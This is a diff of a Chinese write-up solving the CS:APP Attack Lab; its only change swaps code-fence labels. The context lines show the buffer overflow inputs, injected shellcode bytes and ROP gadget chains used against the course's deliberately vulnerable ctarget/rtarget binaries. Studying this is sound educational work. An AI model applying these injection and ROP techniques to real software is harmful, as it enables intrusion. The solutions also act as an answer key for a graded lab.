@@ -22,7 +22,7 @@ Writeup请去官网自取：[点击这里](http://csapp.cs.cmu.edu/3e/labs.html)
 
 此份实验包含了如下五个文件，都是有用的
 
-```text
+```
 README.txt: A file describing the contents of the directory
 
 ctarget: An executable program vulnerable to code-injection attacks
@@ -101,7 +101,7 @@ void touch1()
 
 `getbuf()`的汇编代码如下，可以看到分配了`0x28`即40字节。
 
-```text
+```
 00000000004017a8 <getbuf>:
   4017a8: 48 83 ec 28           sub    $0x28,%rsp
   4017ac: 48 89 e7              mov    %rsp,%rdi
@@ -115,7 +115,7 @@ void touch1()
 
 要覆写`ret`的地址，我们只需要构造字节码即可
 
-```text
+```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -126,7 +126,7 @@ c0 17 40 00 00 00 00 00 /* modify ret address saved on stack */
 
 PASS
 
-```text
+```
 ➜  attacklab git:(main) ✗ ./hex2raw < phase_1.txt | ./ctarget -q
 Cookie: 0x59b997fa
 Type string:Touch1!: You called touch1()
@@ -163,7 +163,7 @@ void touch2(unsigned val)
 
 我们先构造一下汇编代码
 
-```text
+```
 mov $0x59b997fa, %rdi
 pushq $0x4017ec
 retq
@@ -171,7 +171,7 @@ retq
 
 将汇编给编译后反汇编，得出对应的字节码
 
-```text
+```
 0000000000000000 <.text>:
    0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
    7:   68 ec 17 40 00          pushq  $0x4017ec
@@ -182,7 +182,7 @@ retq
 
 所以最后构造出来的字节码如下，注意，汇编指令的字节码，不需要按大小端序进行排布。
 
-```text
+```
 48 c7 c7 fa 97 b9 59 68
 ec 17 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
@@ -227,7 +227,7 @@ Writeup里头写了这些
 
 从`hexmatch()`的汇编也可以看出，实际是对着`%rsp`减了126，应该是用来给`cbuf[110]`用的，从代码上可以看出，这波是在随机的起始地址上存了cookie的字符串，那么也就是说，`hexmatch`函数随机存入的cookie string，有可能会把我们构造的字符串给覆盖掉
 
-```text
+```
 401850: 48 83 c4 80           add    $0xffffffffffffff80,%rsp
 ```
 
@@ -235,13 +235,13 @@ Writeup里头写了这些
 
 紧接着，cookie的字符串的字节码如下
 
-```text
+```
 35 39 62 39 39 37 66 61 00
 ```
 
 我们写出下面的汇编
 
-```text
+```
 sub $0x30, %rsp # protect
 movq $0x5561dc78, %rdi # addr of cookie string
 movq $0x4018fa, %rax # addr of touch3()
@@ -251,7 +251,7 @@ retq
 
 所以最后的字节码如下
 
-```text
+```
 /* cookie string */
 35 39 62 39 39 37 66 61
 00 00 00 00 00 00 00 00
@@ -287,7 +287,7 @@ void setval_210(unsigned *p)
 
 被编译为
 
-```text
+```
 400f15: c7 07 d4 48 89 c7   movl $0xc78948d4,(%rdi)
 400f1b: c3                  retq
 ```
@@ -310,7 +310,7 @@ void setval_210(unsigned *p)
 
 查表后发现有代码`popq %rax`和`movq %rax, %rdi`
 
-```text
+```
 00000000004019a7 <addval_219>:
   4019a7: 8d 87 51 73 58 90     lea    -0x6fa78caf(%rdi),%eax
   4019ad: c3                    retq 
@@ -324,7 +324,7 @@ void setval_210(unsigned *p)
 
 因此很容易构造出对应的字节码，从溢出的部分开始，自底向上，分别为`popq`的gadget地址，cookie的二进制，`movq`的gadget地址，以及`touch2()`的地址
 
-```text
+```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -351,7 +351,7 @@ ec 17 40 00 00 00 00 00
 
 那么，相对地址可以吗？可以的！紧随`mid_farm`后面的函数`add_xy()`就已经给我们指点了明路：只需要`%rsp+offset`即可得到字符串的起始地址。
 
-```text
+```
 00000000004019d6 <add_xy>:
   4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
   4019da: c3 
@@ -361,7 +361,7 @@ ec 17 40 00 00 00 00 00
 
 再结合phase4的分析，最后得出如下的语句
 
-```text
+```
 48 89 e0    movq %rsp,%rax
 48 89 c7    movq %rax,%rdi
 58          popq %rax
@@ -385,7 +385,7 @@ ec 17 40 00 00 00 00 00
 
 最后要构造的字节码应有如下结构（地址从低到高）
 
-```text
+```
 48 89 e0    movq %rsp,%rax
 48 89 c7    movq %rax,%rdi
 58          popq %rax
@@ -400,7 +400,7 @@ ec 17 40 00 00 00 00 00
 
 结果如下
 
-```text
+```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
